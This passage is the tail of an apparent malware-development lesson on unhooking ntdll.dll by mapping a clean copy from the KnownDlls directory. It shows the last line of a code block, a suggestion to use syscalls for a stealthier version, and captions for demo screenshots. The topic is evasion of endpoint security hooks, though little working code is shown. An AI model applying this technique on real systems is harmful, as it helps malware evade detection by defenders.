	return TRUE;
}
</code></pre><h3 id="445beee7-19bc-4207-872f-3104aaf933b9" class=""><strong>Improving The Implementation</strong></h3><p id="54751794-11ee-4f67-b76d-0d7e1da001b5" class="">The current implementation unhooks <code>ntdll.dll</code> using WinAPIs. For a stealthier implementation, direct or indirect syscalls should be used to perform unhooking. This will be left as an objective for the reader.</p><h3 id="5397c422-41da-4a93-85ca-4ab827e822df" class=""><strong>Demo</strong></h3><p id="feb91751-94fc-44f9-a0f6-226624d333ca" class="">The mapped ntdll.dll file from the KnownDlls directory.</p><figure id="bd4148c2-2c65-4f87-a550-78557cfbee9a" class="image"><a href="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-218529831-d561ae0a-5e2b-4da9-9eb6-a4301c970693.png"><img style="width:1528px" src="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-218529831-d561ae0a-5e2b-4da9-9eb6-a4301c970693.png"/></a></figure><p id="d2ee0d59-f6cf-4572-89e0-21c929ec84a1" class="">The hooked ntdll.dll text section to be replaced.</p><figure id="ec2c8898-c468-4b93-9f56-1cf7c0cdca72" class="image"><a href="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-318529838-7c90c7e7-efd9-4dcb-965f-0b562e1e32d5.png"><img style="width:1517px" src="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-318529838-7c90c7e7-efd9-4dcb-965f-0b562e1e32d5.png"/></a></figure><p id="65f56d13-30a0-4bb4-82a8-b8336b72642d" class="">The text section base address of the unhooked ntdll.dll.</p><figure id="b9cec09b-20e5-4e57-850f-0f9800f1e503" class="image"><a href="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-418529851-010d8412-8dce-4855-bfb8-fb083f7a15ee.png"><img style="width:1499px" src="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-418529851-010d8412-8dce-4855-bfb8-fb083f7a15ee.png"/></a></figure><p id="c7ea7f02-8c89-4be9-9299-c5ed20d0be1d" class="">Replacing the text section.</p><figure id="0bc49cad-5111-41d1-a507-d6aa2ac797b5" class="image"><a href="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-518529888-b486838f-b284-46e5-83d4-54cfe050fed0.png"><img style="width:1556px" src="85%20NTDLL%20Unhooking%20-%20From%20KnownDlls%20Directory%20db89a0c0abe54a799e9816e7a2237546/ntdll-unhooking-knowndlls-518529888-b486838f-b284-46e5-83d4-54cfe050fed0.png"/></a></figure></div></article></body></html>